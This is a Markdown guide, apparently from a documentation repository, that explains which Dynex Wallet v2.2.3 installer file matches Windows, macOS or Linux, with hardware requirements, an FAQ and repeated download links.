<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Which Dynex Wallet File Should You Download?

**Pick the file that matches your operating system and chip: `dynex-wallet-windows-v2.2.3.exe` for Windows, `dynex-wallet-macos-v2.2.3.dmg` for Mac, or `dynex-wallet-linux-x64-v2.2.3.zip` for Linux -- all from the official release.**

Release pages often list several files at once, and it's easy to grab the wrong one, especially if you're downloading on behalf of someone else's computer or switching platforms. This guide breaks down exactly what each file is for.

## You'll see this if...

- You're on the [download page](https://dynexwallet.org/download) or the GitHub releases page and see multiple files listed.
- You downloaded a file and your operating system won't open it.
- You're setting up Dynex Wallet on a machine that isn't the one you're currently using (e.g. downloading on a work PC to transfer to a home Mac).
- You've heard about a web wallet or mobile app and aren't sure if that's an option instead.

## Why it happens

Dynex Wallet v2.2.3 is distributed as three separate files because each operating system expects its own installer format and because Apple Silicon and Intel Macs, while covered by the same `.dmg`, run different native code under the hood. There's no single universal installer the way there might be for a web app, so matching file to platform is a manual step every time you download.

## Step-by-step fix

1. Identify your operating system and, if on a Mac, your chip type (Apple menu > About This Mac shows this).
2. For Windows 10/11 64-bit, download `dynex-wallet-windows-v2.2.3.exe`. See [installing Dynex Wallet on Windows](./install-dynex-wallet-windows.md) for the full walkthrough.
3. For macOS 11 or later, Intel or Apple Silicon, download `dynex-wallet-macos-v2.2.3.dmg`. The same file supports both chip types. See [installing Dynex Wallet on macOS](./install-dynex-wallet-macos.md).
4. For Linux x64, download `dynex-wallet-linux-x64-v2.2.3.zip`. See [installing Dynex Wallet on Linux](./install-dynex-wallet-linux.md).
5. Before running it, confirm the file against the [official v2.2.3 release page](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).
6. Use the official release page as your reference for what a genuine file looks like.
7. If you're unsure your hardware qualifies, check the basic requirements: 64-bit processor, 2+ cores, 8 GB RAM recommended, 5 GB free disk space, and an internet connection.
8. Confirm there is no mobile app and that the web wallet is currently under maintenance -- the desktop apps above are the supported way to use Dynex Wallet right now.

## If that didn't work

If your operating system refuses to open the file you downloaded, double-check the file extension matches what your OS expects: `.exe` for Windows, `.dmg` for macOS, `.zip` for Linux. A mismatched file (for example, downloading the `.dmg` on a Windows PC by mistake) simply won't run, which is normal and expected -- it's not a corrupted download, just the wrong platform's file.

If you downloaded on one machine intending to move the installer to another, make sure you double-check which machine's operating system actually needs the file before transferring it, especially when helping someone else set up their wallet remotely.

If you're looking for a mobile app or want to use Dynex Wallet without installing anything, note that there currently isn't a mobile app, and the [web wallet](https://dynexwallet.org/web-wallet) is under maintenance -- the desktop apps are the reliable path for now.

## Prevent it next time

Bookmark the official [download page](https://dynexwallet.org/download) rather than relying on search results, which can surface outdated mirrors or, worse, lookalike phishing sites -- see [avoiding fake Dynex Wallets and phishing](https://dynexwallet.org/security) for more on spotting those. When downloading for someone else or for a machine you're not sitting at, confirm the exact OS version and chip architecture with them first rather than guessing.

Keep a short note of which build (Windows, macOS, or Linux) and which version you have installed on each of your devices, especially if you manage wallets across multiple machines, so future updates go smoothly. And always pick v2.2.3 over any older file you might still have cached locally -- it includes the sync watchdog, wallet optimizer for small mining payouts, clearer locked-versus-unconfirmed balance display, and remote node support that earlier builds lack, regardless of which platform you're on.

## FAQ

### Is there one file that works on all operating systems?
No. Each operating system requires its own file: `.exe` for Windows, `.dmg` for macOS, `.zip` for Linux.

### Does the macOS file differ for Intel vs Apple Silicon?
No, the single `dynex-wallet-macos-v2.2.3.dmg` supports both architectures.

### Is there a 32-bit version for older Windows PCs?
No, the current build is 64-bit only on all platforms.

### Is there an official mobile app for Dynex Wallet?
Not currently. Desktop is the supported platform for Windows, macOS, and Linux.

### What about the web wallet mentioned on the site?
It's currently under maintenance; use a desktop build in the meantime. See [desktop vs web wallet](https://dynexwallet.org/web-wallet).

### How do I know the file I downloaded wasn't tampered with?
If anything about the file looks different from the release page, delete it and download again.

## A quick reference table

- Windows 10/11, 64-bit: `dynex-wallet-windows-v2.2.3.exe` -- signed installer, standard double-click setup.
- macOS 11+, Intel: `dynex-wallet-macos-v2.2.3.dmg` -- notarised, drag-to-Applications install.
- macOS 11+, Apple Silicon (M1/M2/M3 and later): same `dynex-wallet-macos-v2.2.3.dmg` file as Intel.
- Linux x64: `dynex-wallet-linux-x64-v2.2.3.zip` -- extract and run, no installer wizard.

If you're ever in doubt reading a release page, match the file extension to your OS first (`.exe`, `.dmg`, `.zip`), then confirm the architecture label (x64, Intel, Apple Silicon) matches your actual hardware rather than assuming. On Windows, Settings > System > About shows whether your system is 64-bit. On a Mac, Apple menu > About This Mac shows the chip. On Linux, running `uname -m` in a terminal will show `x86_64` for a compatible system.

It's also worth remembering that file names and version numbers go hand in hand -- a file ending in an older version number is not the current build and won't include the latest fixes, even if the platform and architecture match correctly. Always check that the version number in the file name is v2.2.3 before downloading, and confirm the same version number shows up inside the app itself after install, as a final sanity check that everything matches up correctly from download to installation to first launch.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [install and verify guides on dynexwallet.org](https://dynexwallet.org/download).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [How to Install Dynex Wallet on Windows](./install-dynex-wallet-windows.md) |
| [How to Install Dynex Wallet on macOS](./install-dynex-wallet-macos.md) |
| [How to Install Dynex Wallet on Linux](./install-dynex-wallet-linux.md) |
| [Dynex many tiny mining payouts](./dynex-many-tiny-mining-payouts.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
